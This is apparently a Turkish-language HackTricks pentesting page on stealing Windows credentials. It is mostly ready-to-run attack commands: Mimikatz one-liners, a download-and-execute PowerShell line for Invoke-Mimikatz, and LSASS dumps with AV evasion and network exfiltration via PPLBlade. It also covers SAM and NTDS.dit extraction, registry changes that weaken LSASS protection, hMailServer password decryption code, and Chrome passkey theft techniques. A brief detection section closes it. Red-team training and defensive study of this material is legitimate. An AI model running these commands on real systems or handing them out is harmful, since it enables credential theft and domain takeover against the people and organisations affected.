# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz Kimlik Bilgileri
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'ın yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Bazı olası kimlik bilgileri korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **aracını** kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV Atlatma

### Procdump + Mimikatz

**Procdump,** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ın meşru bir Microsoft aracı olması nedeniyle**, Defender tarafından algılanmaz.\
Bu aracı **lsass process'ini dump etmek**, **dump'ı indirmek** ve **credentials'ları** dump'tan **yerel olarak çıkarmak** için kullanabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Bazı **AV** araçları, **lsass.exe**'yi dump etmek için **procdump.exe** kullanılmasını **malicious** olarak **detect** edebilir; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **detect** etmeleridir. Bu nedenle, **procdump**'a **lsass.exe** adını vermek **yerine**, **argument** olarak lsass.exe'nin **PID** değerini **pass** etmek daha **stealthier** bir yöntemdir.

### **comsvcs.dll** ile lsass Dump Etme

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, bir crash gerçekleştiğinde **process memory** dump etmekten sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argument'i kullanmak önemli değildir, ancak üçüncü argument üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump file konumu ikinci bileşeni, üçüncü bileşen ise kesinlikle **full** kelimesini oluşturur. Alternatif bir seçenek mevcut değildir.\
Bu üç bileşen parse edildikten sonra DLL, dump file oluşturur ve belirtilen process'in memory'sini bu file'a aktarır.\
**comsvcs.dll** kullanılarak lsass process'i dump edilebilir; böylece procdump'ı upload edip execute etmeye gerek kalmaz. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.

Çalıştırma için aşağıdaki command kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci [**lssasy**](https://github.com/Hackndo) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dump alma**

1. Task Bar'a sağ tıklayın ve Task Manager'a tıklayın
2. More details'a tıklayın
3. Processes sekmesinde "Local Security Authority Process" process'ini bulun
4. "Local Security Authority Process" process'ine sağ tıklayın ve "Create dump file"a tıklayın.

### procdump ile lsass dump alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft imzalı bir binary'dir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dump Etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske yazmadan uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın signature-based detection mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
3. Bellek dump'ını diske yazmadan (fileless dump), RAW ve SMB upload yöntemleriyle yükleme
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump olmadan SSP-tabanlı LSASS dumping

Ink Dragon, `MiniDumpWriteDump` çağırmayan ve bu nedenle EDR'nin bu API üzerindeki hook'larının hiç tetiklenmediği, üç aşamalı **LalsDumper** aracını sunar:

1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan placeholder'ı arar, bunu `rtu.txt` dosyasının absolute path'i ile üzerine yazar, patch'lenmiş DLL'yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu işlem, **LSASS**'ı malicious DLL'yi yeni bir Security Support Provider (SSP) olarak yüklemeye zorlar.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll`'yi yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte'ı `0x20` ile XOR'lar ve decode edilmiş blob'u execution'ı devretmeden önce memory'ye map eder.
3. **Aşama 3 dumper** – Map edilmiş payload, hash'lenmiş API name'lerden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular. `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, compressed LSASS dump'ını dosyaya stream eder ve exfiltration işleminin daha sonra yapılabilmesi için handle'ı kapatır.

Operator notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı directory içinde tutun. Aşama 1, hard-coded placeholder'ı `rtu.txt` dosyasının absolute path'i ile yeniden yazar; bu nedenle dosyaları ayırmak chain'i bozar.
* Registration, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` değerine eklenmesiyle gerçekleşir. LSASS'ın her boot sırasında SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz seed edebilirsiniz.
* `%TEMP%\*.ddt` dosyaları compressed dump'lardır. Bunları locally decompress edin, ardından credential extraction için Mimikatz/Volatility'ye verin.
* `lals.exe` çalıştırılırken `AddSecurityPackageA`'nın başarılı olması için admin/SeTcb rights gerekir; çağrı döndüğünde LSASS rogue SSP'yi transparently yükler ve Aşama 2'yi execute eder.
* DLL'nin disk'ten kaldırılması onu LSASS'tan evict etmez. Registry entry'sini silip LSASS'ı restart edin (reboot) veya long-term persistence için bırakın.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets Dump Etme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit Dump'lama
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump target DC'den NTDS.dit password history bilgilerini çıkarma
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ konumlarında **bulunmalıdır**. Ancak **korundukları için bunları normal bir şekilde kopyalayamazsınız**.

### Registry'den

Bu dosyaları çalmanın en kolay yolu, Registry'den bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**İndirin** bu dosyaları Kali makinenize ve şu komutu kullanarak **hash'leri çıkarın**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu service'i kullanarak korunan dosyaların kopyasını oluşturabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary'si yalnızca Windows Server sürümlerinde kullanılabilir.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynısını **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağını** gösteren bir örnektir (kullanılan sabit disk "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) de kullanılabilir.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkındaki kritik verileri barındırarak **Active Directory**'nin kalbi olarak bilinir. Domain kullanıcılarına ait **password hashes** burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları depolamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptors** burada tutulur ve depolanan nesnelerin güvenliği ile erişim kontrolü sağlanır.

Bu konu hakkında daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu işlem _lsass.exe_ tarafından gerçekleştirilir. Ardından, **NTDS.dit** dosyasının **bir kısmı `lsass`** belleğinde bulunabilir (muhtemelen performansı artırmak için kullanılan bir **cache** nedeniyle en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'lerin şifresini çözme

Hash 3 kez şifrelenir:

1. **BOOTKEY** ve **RC4** kullanılarak Password Encryption Key'in (**PEK**) şifresini çözün.
2. **PEK** ve **RC4** kullanılarak **hash**'in şifresini çözün.
3. **DES** kullanarak **hash**'in şifresini çözün.

**PEK**, **her domain controller** üzerinde **aynı değere** sahiptir, ancak **domain controller'ın SYSTEM dosyasındaki BOOTKEY** kullanılarak **NTDS.dit** dosyası içinde **şifrelenir** (**domain controller'lar arasında farklıdır**). Bu nedenle NTDS.dit dosyasından credentials elde etmek için **NTDS.dit** ve **SYSTEM** dosyalarına (_C:\Windows\System32\config\SYSTEM_) ihtiyacınız vardır.

### Ntdsutil kullanarak NTDS.dit'i kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) tekniğini de kullanabilirsiniz. **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**registry'den dump alın veya volume shadow copy**](#stealing-sam-and-system) tekniğini kullanın).

### **NTDS.dit dosyasından hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, **hash'leri çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Bunları geçerli bir domain admin kullanıcısı kullanarak otomatik olarak **extract** edebilirsiniz:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**Büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkartılması önerilir.

Son olarak, **metasploit module** de kullanılabilir: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit dosyasından domain objects öğelerini bir SQLite veritabanına çıkarma**

NTDS objects, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Yalnızca secrets çıkarılmaz; ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarmak için tüm objects ve bunların attributes değerleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak secrets decryption için gereklidir (NT & LM hashes, cleartext passwords gibi supplemental credentials, kerberos veya trust keys, NT & LM password histories). Diğer bilgilerin yanı sıra aşağıdaki veriler de çıkarılır: hash'leriyle birlikte user ve machine accounts, UAC flags, last logon ve password change timestamp'leri, accounts description'ları, names, UPN, SPN, groups ve recursive memberships, organizational units tree ve membership, trusts type, direction ve attributes bilgileriyle trusted domains...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli software'lerden credentials çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekteki kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Buradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **execute edin**; parolalar extract edilecektir.

## Atıl RDP oturumlarını inceleme ve security controls'ü zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker içerir:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altındaki her user hive’ı parse edin. Her alt anahtar server name, `UsernameHint` ve son yazma timestamp’ini depolar. FinalDraft’ın logic’ini PowerShell ile replicate edebilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – kimin box’ı administer ettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log’unu Event ID’leri **21** (successful logon) ve **25** (disconnect) için query edin:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **disconnected** session’ı hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, verifier’larını ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` alınabilir veya domain controller’lar üzerinde persistence stage’lenebilir.

### Registry downgrades targeted by FinalDraft

Aynı implant, credential theft’i kolaylaştırmak için birkaç registry key’i de tamper eder:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarlamak, RDP sırasında tam credential/ticket reuse işlemini zorunlu kılar ve pass-the-hash tarzı pivot'ları etkinleştirir.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtering'i devre dışı bırakır; böylece yerel admin'ler ağ üzerinden unrestricted token'lar alır.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM administrator'ının log on olmasına izin verir ve saldırganlara başka bir yerleşik high-privilege account sağlar.
* `RunAsPPL=0`, LSASS PPL protections'ı kaldırır ve LalsDumper gibi dumper'lar için memory access işlemini kolaylaştırır.

## hMailServer database credentials (post-compromise)

hMailServer, DB password değerini `[Database] Password=` altında `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında saklar. Değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4-byte word endianness swaps kullanılarak Blowfish ile encrypt edilir. INI'deki hex string'i aşağıdaki Python snippet'iyle kullanın:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Açık metin parolasıyla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32-bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu hMailServer hash formatını (hashcat mode `1421`) kullanır. Bu değerleri kırmak, WinRM/SSH pivotları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback `LsaApLogonUserEx2` öğesini intercept ederek **açık metin oturum açma parolalarını** yakalar. Amaç, kimlik bilgilerinin **oturum açma sırasında** (hashing işleminden önce) yakalanması ve ardından diske yazılması veya operatöre döndürülmesi için authentication package callback öğesini hook'lamak ya da sarmalamaktır. Bu işlem genellikle LSA'ya inject olan veya LSA'ya kaydolan ve ardından başarılı her interactive/network logon olayını kullanıcı adı, domain ve parolayla kaydeden bir helper kullanılarak gerçekleştirilir.

Operasyonel notlar:
- Helper'ı authentication path'e yüklemek için local admin/SYSTEM yetkileri gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kaydedilmiş bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dumper'lar dosyayı ayrıştırabilir ve kaydedilmiş SQL kimlik bilgilerini kurtarabilir. Yalnızca command output döndüren shell'lerde dosya genellikle Base64 olarak encode edilip stdout'a yazdırılarak exfiltrate edilir.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı

Windows host üzerinde **victim user** olarak **Chrome + Google Password Manager ile senkronize edilmiş passkeys** kullanılarak code execution elde edilirse, admin/SYSTEM olmadan bile passkeys ilginç bir post-exploitation hedefi hâline gelir.

### İlgi çekici yerel artifact'ler
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**, protobuf-encoded **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir process, senkronize edilmiş passkey'ler için **RP ID**, **username**, **credential ID** ve şifrelenmiş private-key materyalini listeleyebilir.
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize edilmiş credential'ları kurtarmak için kullanılan wrapped secret gibi yerel device-enrollment durumunu depolar.

Hızlı triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs yine de yerel bir signing oracle olarak kötüye kullanılabilir

Tarayıcı, TPM-backed bir identity key'i **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u user-accessible state içinde saklarsa malware'in raw private key'i extract etmesine gerek kalmaz. Aynı makinede blob'u yeniden import edip local TPM'den attacker-controlled data'yı sign etmesini isteyebilir:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Bu, **hardware binding'in cihaz dışına export'u önlediği, ancak ele geçirilmiş endpoint üzerinde aynı kullanıcı tarafından kullanımı önlemediği** anlamına gelir.

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**
- Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` değerlerini enumerate edin.
- Bir passkey login başlatın ve yeni bir WebAuthn challenge alın.
- Cloud-authenticator request binding'ini imzalamak için çalınan `wrapped_identity_private_key` blob'unu victim TPM üzerinde kullanın.
- Dönen assertion'ı relying party'ye relay edin.
- Bu, özellikle RP `userVerification=preferred` kabul ettiğinde veya **`UV=0`** olan assertion'ları reddetmediğinde değerlidir.
2. **Pending UV-key hijack**
- `passkey_enclave_state`'i silerek veya geçerli imzalı bir `device/forget` operation göndererek yeniden onboarding'i zorlayın.
- Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa attacker-controlled bir UV public key register edin.
- Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmıyorsa sonraki signature'lar attacker key'den gelse bile **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**
- Chrome'un synced-passkey master secret'ı fetch etmesi için recovery veya rejoin'i zorlayın.
- `passkey_enclave_state` yeniden oluşturulurken veya değiştirilirken bunu izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunduğu sırada Chrome memory dump alın.
- Kurtarılan SDS'yi her `WebauthnCredentialSpecifics` kaydındaki encrypted field'ları decrypt etmek ve taşınabilir WebAuthn private key'leri kurtarmak için kullanın.

### DFIR / detection ideas

- `passkey_enclave_state`'in **silinmesini/yeniden oluşturulmasını** izleyin.
- Browser olmayan process'lerin Chrome **`Sync Data\LevelDB`** konumuna anormal erişimlerini alert olarak işaretleyin.
- **Chrome memory dump** işlemlerini veya şüpheli cross-process memory access olaylarını alert olarak işaretleyin.
- Tekrarlanan **Google Password Manager recovery PIN** prompt'larını veya beklenmeyen yeniden onboarding işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin synced passkey'lerde çoğunlukla yararlı olmadığını unutmayın; sabit kalabildiği için klasik clone detection zayıftır.

## References

- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
